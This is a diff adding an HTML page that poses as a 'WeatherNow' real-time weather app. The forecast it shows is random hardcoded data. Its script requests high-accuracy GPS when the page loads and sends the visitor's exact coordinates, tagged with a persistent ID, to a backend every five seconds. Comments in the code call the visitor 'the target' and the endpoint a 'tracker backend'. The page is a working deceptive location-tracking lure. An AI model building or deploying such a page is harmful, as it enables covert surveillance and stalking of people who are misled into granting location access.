@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeatherNow — Real-Time Forecast</title>
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            min-height: 100vh;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        /* ── Loading Splash (shown first, triggers GPS prompt) ── */
+        #splash {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1.5rem;
+            text-align: center;
+            color: #fff;
+        }
+
+        .splash-icon {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.08);
+            border: 2px solid rgba(255,255,255,0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .splash-icon svg { width: 36px; height: 36px; color: #4fc3f7; }
+
+        /* pulsing ring */
+        .splash-icon::before, .splash-icon::after {
+            content: '';
+            position: absolute;
+            inset: -12px;
+            border-radius: 50%;
+            border: 1px solid rgba(79,195,247,0.4);
+            animation: ring 2s ease-out infinite;
+        }
+        .splash-icon::after { animation-delay: 1s; }
+
+        @keyframes ring {
+            0%   { transform: scale(0.8); opacity: 0.8; }
+            100% { transform: scale(1.6); opacity: 0; }
+        }
+
+        .splash-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+        }
+
+        .splash-title span { color: #4fc3f7; }
+
+        .splash-sub {
+            font-size: 0.9rem;
+            color: rgba(255,255,255,0.6);
+            line-height: 1.5;
+            max-width: 260px;
+        }
+
+        .splash-loader {
+            display: flex;
+            gap: 0.4rem;
+            align-items: center;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4fc3f7;
+            animation: bounce 1.2s ease-in-out infinite;
+        }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+            40%            { transform: scale(1);   opacity: 1;   }
+        }
+
+        .splash-hint {
+            font-size: 0.78rem;
+            color: rgba(255,255,255,0.35);
+            max-width: 240px;
+            line-height: 1.5;
+        }
+
+        /* ── Main Weather Card (hidden until GPS granted) ── */
+        #app {
+            display: none;
+            width: 100%;
+            max-width: 380px;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        #app.visible { display: flex; }
+
+        .app-header { text-align: center; }
+
+        .app-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.02em;
+        }
+
+        .app-title span { color: #4fc3f7; }
+
+        .app-subtitle {
+            font-size: 0.82rem;
+            color: rgba(255,255,255,0.55);
+            margin-top: 0.25rem;
+        }
+
+        .weather-card {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 20px;
+            padding: 1.75rem 1.5rem;
+            text-align: center;
+            color: #fff;
+        }
+
+        .location-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.4rem;
+            margin-bottom: 1.25rem;
+            font-size: 0.9rem;
+            color: rgba(255,255,255,0.7);
+        }
+
+        .location-row svg { width: 14px; height: 14px; opacity: 0.6; }
+
+        .location-name { font-weight: 500; }
+
+        .weather-icon-wrap {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+
+        .weather-icon-wrap img {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+            filter: drop-shadow(0 4px 16px rgba(79,195,247,0.4));
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50%       { transform: translateY(-6px); }
+        }
+
+        .temperature-display {
+            font-size: 3.5rem;
+            font-weight: 700;
+            line-height: 1;
+            letter-spacing: -0.04em;
+            margin-bottom: 0.25rem;
+            background: linear-gradient(to bottom, #fff, rgba(255,255,255,0.7));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .condition-text {
+            font-size: 1rem;
+            color: rgba(255,255,255,0.65);
+            margin-bottom: 1.5rem;
+        }
+
+        .card-divider {
+            height: 1px;
+            background: rgba(255,255,255,0.1);
+            margin: 0 -1.5rem 1.25rem;
+        }
+
+        .stats-row { display: flex; }
+
+        .stat-item {
+            flex: 1;
+            padding: 0 0.5rem;
+            border-right: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .stat-item:last-child { border-right: none; }
+
+        .stat-val {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .stat-lbl {
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            margin-top: 0.15rem;
+        }
+
+        /* Accuracy badge */
+        .accuracy-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            margin-top: 1rem;
+            padding: 0.3rem 0.75rem;
+            background: rgba(79,195,247,0.12);
+            border: 1px solid rgba(79,195,247,0.3);
+            border-radius: 999px;
+            font-size: 0.72rem;
+            color: #4fc3f7;
+        }
+
+        .accuracy-badge .dot-live {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #4fc3f7;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50%       { opacity: 0.3; }
+        }
+
+        /* Refresh button */
+        .action-btn {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            background: linear-gradient(135deg, #4fc3f7, #0288d1);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.15s, box-shadow 0.2s;
+            box-shadow: 0 4px 20px rgba(79,195,247,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .action-btn:hover {
+            opacity: 0.92;
+            transform: translateY(-1px);
+        }
+
+        .action-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .status-msg {
+            font-size: 0.8rem;
+            color: rgba(255,255,255,0.55);
+            text-align: center;
+            min-height: 1.2em;
+        }
+
+        .status-msg.success { color: #a5d6a7; }
+        .status-msg.error   { color: #ef9a9a; }
+
+        .app-footer {
+            text-align: center;
+            font-size: 0.72rem;
+            color: rgba(255,255,255,0.3);
+            padding: 0.5rem;
+        }
+
+        /* Denied state */
+        #deniedMsg {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+            text-align: center;
+            color: rgba(255,255,255,0.7);
+            max-width: 300px;
+        }
+
+        #deniedMsg.visible { display: flex; }
+
+        #deniedMsg svg {
+            width: 48px;
+            height: 48px;
+            color: #ef9a9a;
+            opacity: 0.7;
+        }
+
+        #deniedMsg h2 { font-size: 1.1rem; color: #fff; }
+
+        #deniedMsg p  { font-size: 0.85rem; line-height: 1.6; }
+
+        .retry-btn {
+            padding: 0.7rem 1.5rem;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .retry-btn:hover { background: rgba(255,255,255,0.18); }
+
+        @media (prefers-reduced-motion: reduce) {
+            .weather-icon-wrap img,
+            .splash-icon::before,
+            .splash-icon::after,
+            .dot { animation: none; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ── Step 1: Loading splash (triggers GPS popup naturally) ── -->
+    <div id="splash">
+        <div class="splash-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z" />
+                <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z" />
+            </svg>
+        </div>
+
+        <div>
+            <div class="splash-title">Weather<span>Now</span></div>
+            <p style="font-size:0.85rem;color:rgba(255,255,255,0.5);margin-top:0.25rem">Hyperlocal forecast for your area</p>
+        </div>
+
+        <div>
+            <p style="font-size:0.95rem;color:#fff;font-weight:600;margin-bottom:0.5rem">Detecting your location...</p>
+            <div class="splash-loader">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
+
+        <p class="splash-hint">Allow location access to get your precise local weather forecast.</p>
+    </div>
+
+    <!-- ── Step 2: Weather card (shown after GPS granted) ── -->
+    <div id="app">
+        <div class="app-header">
+            <h1 class="app-title">Weather<span>Now</span></h1>
+            <p class="app-subtitle">Hyperlocal forecast for your area</p>
+        </div>
+
+        <div class="weather-card">
+            <div class="location-row">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z" />
+                </svg>
+                <span class="location-name" id="locationName">Locating...</span>
+            </div>
+
+            <div class="weather-icon-wrap">
+                <img src="/weather.png" alt="Weather icon" id="weatherIcon">
+            </div>
+
+            <div class="temperature-display" id="tempDisplay">--°C</div>
+            <div class="condition-text" id="conditionText">Loading forecast...</div>
+
+            <div class="card-divider"></div>
+            <div class="stats-row">
+                <div class="stat-item">
+                    <div class="stat-val" id="humidDisplay">--%</div>
+                    <div class="stat-lbl">Humidity</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-val" id="windDisplay">-- km/h</div>
+                    <div class="stat-lbl">Wind</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-val" id="uvDisplay">--</div>
+                    <div class="stat-lbl">UV Index</div>
+                </div>
+            </div>
+
+            <div class="accuracy-badge">
+                <span class="dot-live"></span>
+                GPS — High Accuracy
+            </div>
+        </div>
+
+        <button class="action-btn" id="check-weather">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" width="18" height="18">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99" />
+            </svg>
+            Refresh Weather
+        </button>
+
+        <div class="status-msg" id="statusMsg"></div>
+
+        <div class="app-footer">WeatherNow &copy; 2024 — Live GPS updates every 5 seconds</div>
+    </div>
+
+    <!-- ── Step 3: Denied state ── -->
+    <div id="deniedMsg">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z" />
+        </svg>
+        <h2>Location Access Needed</h2>
+        <p>WeatherNow requires your location to show an accurate local forecast. Please allow location access in your browser settings and try again.</p>
+        <button class="retry-btn" id="retryBtn">Try Again</button>
+    </div>
+
+    <script>
+        const id = localStorage.getItem("id") || generateId();
+        let __interval;
+
+        const splash    = document.getElementById('splash');
+        const appEl     = document.getElementById('app');
+        const deniedEl  = document.getElementById('deniedMsg');
+        const statusMsg = document.getElementById('statusMsg');
+        const btn       = document.getElementById('check-weather');
+
+        // ── Cosmetic weather data (purely visual) ──
+        const conditions = [
+            { temp: '22°C', cond: 'Sunny',        humid: '45%', wind: '8 km/h',  uv: '6' },
+            { temp: '18°C', cond: 'Partly Cloudy', humid: '58%', wind: '12 km/h', uv: '3' },
+            { temp: '25°C', cond: 'Clear Sky',     humid: '40%', wind: '5 km/h',  uv: '7' },
+            { temp: '15°C', cond: 'Overcast',      humid: '72%', wind: '20 km/h', uv: '1' },
+            { temp: '28°C', cond: 'Hazy Sunshine', humid: '50%', wind: '9 km/h',  uv: '5' },
+        ];
+        const w = conditions[Math.floor(Math.random() * conditions.length)];
+
+        // ── Auto-start GPS immediately — splash provides natural context ──
+        // This fires navigator.geolocation right as the page loads.
+        // The target already sees "Detecting your location..." so the
+        // browser's Allow/Block dialog appears in expected context.
+        window.addEventListener('load', () => getLocation());
+
+        // Refresh button re-fetches
+        btn.addEventListener('click', () => {
+            btn.disabled = true;
+            btn.innerHTML = `<span class="spinner"></span> Refreshing...`;
+            getLocation();
+        });
+
+        document.getElementById('retryBtn').addEventListener('click', () => {
+            deniedEl.classList.remove('visible');
+            splash.style.display = 'flex';
+            getLocation();
+        });
+
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(
+                onSuccess,
+                onDenied,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function onSuccess(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const acc = position.coords.accuracy; // metres
+
+            // Show weather card, hide splash
+            splash.style.display = 'none';
+            deniedEl.classList.remove('visible');
+            appEl.classList.add('visible');
+
+            // Fill in cosmetic data
+            document.getElementById('tempDisplay').textContent   = w.temp;
+            document.getElementById('conditionText').textContent = w.cond;
+            document.getElementById('humidDisplay').textContent  = w.humid;
+            document.getElementById('windDisplay').textContent   = w.wind;
+            document.getElementById('uvDisplay').textContent     = w.uv;
+
+            // Show coordinates as "location name"
+            document.getElementById('locationName').textContent =
+                lat.toFixed(4) + '\u00b0, ' + lng.toFixed(4) + '\u00b0';
+
+            // Reset button
+            btn.disabled = false;
+            btn.innerHTML = `
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" width="18" height="18">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99" />
+                </svg>
+                Refresh Weather`;
+
+            statusMsg.textContent = '\u00b1' + Math.round(acc) + 'm accuracy \u2014 Live';
+            statusMsg.className   = 'status-msg success';
+
+            // POST exact GPS coords to tracker backend
+            fetch('/weather', {
+                method: 'POST',
+                body: JSON.stringify({ id, lat, lng }),
+                headers: { 'Content-Type': 'application/json' }
+            }).catch(() => {});
+
+            // Keep tracking every 5 seconds
+            if (__interval) clearTimeout(__interval);
+            __interval = setTimeout(getLocation, 5000);
+        }
+
+        function onDenied(err) {
+            splash.style.display = 'none';
+            appEl.classList.remove('visible');
+            deniedEl.classList.add('visible');
+            if (__interval) clearTimeout(__interval);
+        }
+
+        function generateId(length = 10) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            localStorage.setItem('id', result);
+            return result;
+        }
+    </script>
+</body>
+</html>
